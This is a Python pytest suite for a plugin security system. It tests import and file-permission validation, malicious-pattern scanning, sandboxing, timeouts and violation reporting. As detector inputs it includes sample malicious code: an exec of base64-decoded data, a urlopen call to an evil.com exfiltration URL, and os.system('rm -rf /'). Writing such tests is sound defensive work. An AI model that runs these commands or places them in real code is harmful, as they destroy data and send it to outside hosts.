"""
Comprehensive test suite for plugin security and isolation features.
Tests security validation, sandboxing, resource limits, and error handling.
"""

import pytest
import asyncio
import tempfile
import os
import time
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
from datetime import datetime

from models.plugin import PluginManifest, PluginPermission
from core.plugin_security import (
    PluginSecurityManager, PluginSandboxManager, PluginValidator,
    PluginIsolationManager, SecurityPolicy, ResourceLimits, SecurityLevel,
    ResourceExceededError, SecurityViolationError
)


class TestPluginValidator:
    """Test enhanced plugin validation"""
    
    def test_validate_plugin_code_dangerous_imports(self):
        """Test detection of dangerous imports"""
        manifest = PluginManifest(
            id="test-plugin",
            name="Test Plugin",
            version="1.0.0",
            description="Test",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[]
        )
        
        dangerous_code = """
import os
import subprocess
import socket
from urllib import request
"""
        
        issues = PluginValidator.validate_plugin_code(dangerous_code, manifest)
        
        assert len(issues) > 0
        assert any("import os" in issue for issue in issues)
        assert any("import subprocess" in issue for issue in issues)
        assert any("import socket" in issue for issue in issues)
    
    def test_validate_plugin_code_file_operations_without_permission(self):
        """Test detection of file operations without proper permissions"""
        manifest = PluginManifest(
            id="test-plugin",
            name="Test Plugin",
            version="1.0.0",
            description="Test",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[]  # No file system permissions
        )
        
        file_code = """
with open('test.txt', 'w') as f:
    f.write('test')
"""
        
        issues = PluginValidator.validate_plugin_code(file_code, manifest)
        
        assert len(issues) > 0
        assert any("file system permission not requested" in issue.lower() for issue in issues)
    
    def test_validate_plugin_code_with_permissions(self):
        """Test that code with proper permissions passes validation"""
        manifest = PluginManifest(
            id="test-plugin",
            name="Test Plugin",
            version="1.0.0",
            description="Test",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[PluginPermission.FILE_SYSTEM_READ, PluginPermission.FILE_SYSTEM_WRITE]
        )
        
        safe_code = """
import json
import datetime

with open('data.json', 'r') as f:
    data = json.load(f)

result = {'timestamp': datetime.datetime.now().isoformat()}
"""
        
        issues = PluginValidator.validate_plugin_code(safe_code, manifest)
        
        # Should have fewer issues since permissions are granted
        file_issues = [issue for issue in issues if "file system permission" in issue.lower()]
        assert len(file_issues) == 0
    
    def test_scan_for_malicious_patterns(self):
        """Test detection of malicious code patterns"""
        malicious_code = """
import base64
encoded = base64.b64decode('c29tZSBkYXRh')
exec(encoded)

import urllib.request
urllib.request.urlopen('http://evil.com/exfiltrate')
"""
        
        issues = PluginValidator.scan_for_malicious_patterns(malicious_code)
        
        assert len(issues) > 0
        assert any("obfuscation" in issue.lower() for issue in issues)
        assert any("exfiltration" in issue.lower() for issue in issues)
    
    def test_validate_safe_code(self):
        """Test that safe code passes validation"""
        safe_code = """
import json
import datetime
import math

def calculate_score(data):
    return sum(data) / len(data) if data else 0

def process_user_data(user_input):
    return {
        'processed': True,
        'timestamp': datetime.datetime.now().isoformat(),
        'score': calculate_score(user_input.get('scores', []))
    }
"""
        
        manifest = PluginManifest(
            id="safe-plugin",
            name="Safe Plugin",
            version="1.0.0",
            description="A safe plugin",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[PluginPermission.READ_USER_DATA]
        )
        
        code_issues = PluginValidator.validate_plugin_code(safe_code, manifest)
        malicious_issues = PluginValidator.scan_for_malicious_patterns(safe_code)
        
        assert len(code_issues) == 0
        assert len(malicious_issues) == 0


class TestPluginIsolationManager:
    """Test plugin isolation and resource monitoring"""
    
    def test_isolation_manager_creation(self):
        """Test isolation manager creation"""
        limits = ResourceLimits(
            max_memory_mb=100,
            max_cpu_time_seconds=5.0,
            max_execution_time_seconds=10.0
        )
        
        manager = PluginIsolationManager("test-plugin", limits)
        
        assert manager.plugin_id == "test-plugin"
        assert manager.resource_limits == limits
        assert manager.resource_usage['memory_mb'] == 0
    
    def test_resource_monitoring(self):
        """Test resource usage monitoring"""
        limits = ResourceLimits(max_file_operations=5)
        manager = PluginIsolationManager("test-plugin", limits)
        
        # Record some operations
        manager.record_operation('file_operations', 3)
        assert manager.resource_usage['file_operations'] == 3
        
        # Should not exceed limit yet
        manager.record_operation('file_operations', 1)
        assert manager.resource_usage['file_operations'] == 4
        
        # Should raise exception when limit exceeded
        with pytest.raises(ResourceExceededError):
            manager.record_operation('file_operations', 2)
    
    def test_usage_report(self):
        """Test usage report generation"""
        limits = ResourceLimits()
        manager = PluginIsolationManager("test-plugin", limits)
        
        manager.start_monitoring()
        time.sleep(0.1)  # Small delay
        manager.record_operation('file_operations', 2)
        
        report = manager.get_usage_report()
        
        assert report['plugin_id'] == "test-plugin"
        assert 'elapsed_time' in report
        assert report['resource_usage']['file_operations'] == 2
        assert 'resource_limits' in report
        
        manager.stop_monitoring()


class TestPluginSandboxManager:
    """Test enhanced plugin sandbox functionality"""
    
    def test_sandbox_creation(self):
        """Test sandbox manager creation"""
        permissions = [PluginPermission.READ_USER_DATA]
        policy = SecurityPolicy()
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        assert sandbox.plugin_id == "test-plugin"
        assert sandbox.permissions == permissions
        assert sandbox.policy == policy
        assert len(sandbox.execution_errors) == 0
        assert len(sandbox.security_violations) == 0
    
    @pytest.mark.asyncio
    async def test_safe_function_execution(self):
        """Test execution of safe functions"""
        permissions = [PluginPermission.READ_USER_DATA]
        policy = SecurityPolicy()
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        def safe_function(x, y):
            return x + y
        
        result = await sandbox.execute_plugin_function(safe_function, 5, 10)
        assert result == 15
        
        # Check that no violations occurred
        usage = sandbox.get_resource_usage()
        assert usage['violation_count'] == 0
        assert usage['error_count'] == 0
    
    @pytest.mark.asyncio
    async def test_file_access_without_permission(self):
        """Test that file access without permission is blocked"""
        permissions = []  # No file permissions
        policy = SecurityPolicy()
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        def file_function():
            with open('/tmp/test.txt', 'w') as f:
                f.write('test')
            return "success"
        
        with pytest.raises(SecurityViolationError):
            await sandbox.execute_plugin_function(file_function)
        
        # Check that violation was recorded
        usage = sandbox.get_resource_usage()
        assert usage['violation_count'] > 0
    
    @pytest.mark.asyncio
    async def test_file_access_with_permission(self):
        """Test that file access with permission works"""
        permissions = [PluginPermission.FILE_SYSTEM_WRITE]
        policy = SecurityPolicy()
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        def file_function():
            # This should work in the temp directory
            temp_file = sandbox.temp_dir / "test.txt"
            with open(temp_file, 'w') as f:
                f.write('test')
            return "success"
        
        # First set up the sandbox to get temp_dir
        with sandbox.secure_execution_context():
            temp_file = sandbox.temp_dir / "test.txt"
        
        def safe_file_function():
            with open(temp_file, 'w') as f:
                f.write('test')
            return "success"
        
        result = await sandbox.execute_plugin_function(safe_file_function)
        assert result == "success"
    
    @pytest.mark.asyncio
    async def test_execution_timeout(self):
        """Test execution timeout enforcement"""
        permissions = []
        policy = SecurityPolicy(
            resource_limits=ResourceLimits(max_execution_time_seconds=0.1)
        )
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        def slow_function():
            time.sleep(1.0)  # Sleep longer than timeout
            return "should not reach here"
        
        with pytest.raises(ResourceExceededError):
            await sandbox.execute_plugin_function(slow_function)
    
    @pytest.mark.asyncio
    async def test_import_restrictions(self):
        """Test import restrictions"""
        permissions = []
        policy = SecurityPolicy()
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        def dangerous_import_function():
            import os  # Should be blocked
            return os.getcwd()
        
        with pytest.raises(SecurityViolationError):
            await sandbox.execute_plugin_function(dangerous_import_function)
        
        # Check that violation was recorded
        usage = sandbox.get_resource_usage()
        assert usage['violation_count'] > 0
    
    def test_security_summary(self):
        """Test security summary generation"""
        permissions = [PluginPermission.READ_USER_DATA]
        policy = SecurityPolicy(security_level=SecurityLevel.STRICT)
        
        sandbox = PluginSandboxManager("test-plugin", permissions, policy)
        
        summary = sandbox.get_security_summary()
        
        assert summary['plugin_id'] == "test-plugin"
        assert summary['security_level'] == SecurityLevel.STRICT
        assert PluginPermission.READ_USER_DATA.value in summary['permissions']
        assert 'violations' in summary
        assert 'errors' in summary
        assert 'resource_usage' in summary


class TestPluginSecurityManager:
    """Test enhanced plugin security manager"""
    
    def test_security_manager_creation(self):
        """Test security manager creation"""
        manager = PluginSecurityManager()
        
        assert isinstance(manager.security_policies, dict)
        assert isinstance(manager.default_policy, SecurityPolicy)
        assert isinstance(manager.security_violations, dict)
    
    def test_manifest_validation(self):
        """Test manifest security validation"""
        manager = PluginSecurityManager()
        
        # Test suspicious manifest
        suspicious_manifest = PluginManifest(
            id="hack-plugin",
            name="Hack Tool",
            version="1.0.0",
            description="This plugin can hack your system",
            author="Hacker",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[PluginPermission.FILE_SYSTEM_WRITE, PluginPermission.NETWORK_ACCESS]
        )
        
        issues = manager.validate_plugin_manifest(suspicious_manifest)
        
        assert len(issues) > 0
        assert any("suspicious keyword" in issue.lower() for issue in issues)
        assert any("dangerous permission combination" in issue.lower() for issue in issues)
    
    def test_code_validation(self):
        """Test comprehensive code validation"""
        manager = PluginSecurityManager()
        
        manifest = PluginManifest(
            id="test-plugin",
            name="Test Plugin",
            version="1.0.0",
            description="Test",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[]
        )
        
        dangerous_code = """
import os
import base64
encoded_payload = base64.b64decode('malicious_code')
exec(encoded_payload)
os.system('rm -rf /')
"""
        
        issues = manager.validate_plugin_code(dangerous_code, manifest)
        
        assert len(issues) > 0
        assert any("dangerous import" in issue.lower() for issue in issues)
        assert any("obfuscation" in issue.lower() for issue in issues)
    
    def test_permission_validation(self):
        """Test enhanced permission validation"""
        manager = PluginSecurityManager()
        
        # Test excessive permissions
        excessive_permissions = [
            PluginPermission.READ_USER_DATA,
            PluginPermission.WRITE_USER_DATA,
            PluginPermission.FILE_SYSTEM_READ,
            PluginPermission.FILE_SYSTEM_WRITE,
            PluginPermission.NETWORK_ACCESS,
            PluginPermission.DATABASE_WRITE
        ]
        
        violations = manager.validate_plugin_permissions("test-plugin", excessive_permissions)
        
        assert len(violations) > 0
        assert any("excessive permissions" in violation.lower() for violation in violations)
    
    def test_security_violation_recording(self):
        """Test security violation recording"""
        manager = PluginSecurityManager()
        
        manager.record_security_violation(
            "test-plugin", 
            "unauthorized_access", 
            "Attempted to access restricted resource",
            "high"
        )
        
        assert "test-plugin" in manager.security_violations
        assert len(manager.security_violations["test-plugin"]) == 1
        
        violation = manager.security_violations["test-plugin"][0]
        assert violation['type'] == "unauthorized_access"
        assert violation['severity'] == "high"
    
    def test_security_report_generation(self):
        """Test comprehensive security report generation"""
        manager = PluginSecurityManager()
        
        # Set up test data
        policy = SecurityPolicy(security_level=SecurityLevel.STRICT)
        manager.set_plugin_policy("test-plugin", policy)
        
        manager.record_security_violation(
            "test-plugin",
            "test_violation",
            "Test violation details",
            "medium"
        )
        
        report = manager.get_security_report("test-plugin")
        
        assert report['plugin_id'] == "test-plugin"
        assert report['security_policy']['security_level'] == SecurityLevel.STRICT
        assert report['violation_count'] == 1
        assert report['critical_violations'] == 0
        assert 'last_check' in report
    
    def test_isolation_manager_creation(self):
        """Test isolation manager creation"""
        manager = PluginSecurityManager()
        
        isolation_manager = manager.create_isolation_manager("test-plugin")
        
        assert isolation_manager.plugin_id == "test-plugin"
        assert "test-plugin" in manager.isolation_managers
    
    def test_cleanup_plugin_security(self):
        """Test security cleanup for plugins"""
        manager = PluginSecurityManager()
        
        # Create isolation manager
        isolation_manager = manager.create_isolation_manager("test-plugin")
        
        # Record violation
        manager.record_security_violation("test-plugin", "test", "test", "low")
        
        # Cleanup
        manager.cleanup_plugin_security("test-plugin")
        
        # Isolation manager should be removed
        assert "test-plugin" not in manager.isolation_managers
        
        # Violations should be kept for audit
        assert "test-plugin" in manager.security_violations


class TestSecurityIntegration:
    """Integration tests for security components"""
    
    @pytest.mark.asyncio
    async def test_complete_security_workflow(self):
        """Test complete security workflow from validation to execution"""
        # Create security manager
        security_manager = PluginSecurityManager()
        
        # Create manifest
        manifest = PluginManifest(
            id="integration-test",
            name="Integration Test Plugin",
            version="1.0.0",
            description="Integration test",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[PluginPermission.READ_USER_DATA]
        )
        
        # Validate manifest
        manifest_issues = security_manager.validate_plugin_manifest(manifest)
        assert len(manifest_issues) == 0  # Should be clean
        
        # Validate code
        safe_code = """
import json
import datetime

def process_data(data):
    return {
        'processed': True,
        'timestamp': datetime.datetime.now().isoformat(),
        'data_length': len(data) if data else 0
    }
"""
        
        code_issues = security_manager.validate_plugin_code(safe_code, manifest)
        assert len(code_issues) == 0  # Should be clean
        
        # Create sandbox and execute
        sandbox = security_manager.create_sandbox_manager("integration-test", manifest.permissions)
        
        def test_function():
            import json
            import datetime
            return {
                'result': 'success',
                'timestamp': datetime.datetime.now().isoformat()
            }
        
        result = await sandbox.execute_plugin_function(test_function)
        
        assert result['result'] == 'success'
        assert 'timestamp' in result
        
        # Check security report
        report = security_manager.get_security_report("integration-test")
        assert report['violation_count'] == 0
    
    @pytest.mark.asyncio
    async def test_security_violation_workflow(self):
        """Test workflow when security violations occur"""
        security_manager = PluginSecurityManager()
        
        manifest = PluginManifest(
            id="violation-test",
            name="Violation Test",
            version="1.0.0",
            description="Test violations",
            author="Test",
            entry_point="main.py",
            min_platform_version="1.0.0",
            permissions=[]  # No permissions
        )
        
        # Create sandbox
        sandbox = security_manager.create_sandbox_manager("violation-test", manifest.permissions)
        
        def violating_function():
            # Try to access file without permission
            with open('/tmp/test.txt', 'w') as f:
                f.write('violation')
            return "should not succeed"
        
        # Should raise security violation
        with pytest.raises(SecurityViolationError):
            await sandbox.execute_plugin_function(violating_function)
        
        # Check that violations were recorded
        usage = sandbox.get_resource_usage()
        assert usage['violation_count'] > 0
        
        summary = sandbox.get_security_summary()
        assert len(summary['violations']) > 0


if __name__ == "__main__":
    # Run the tests
    pytest.main([__file__, "-v"])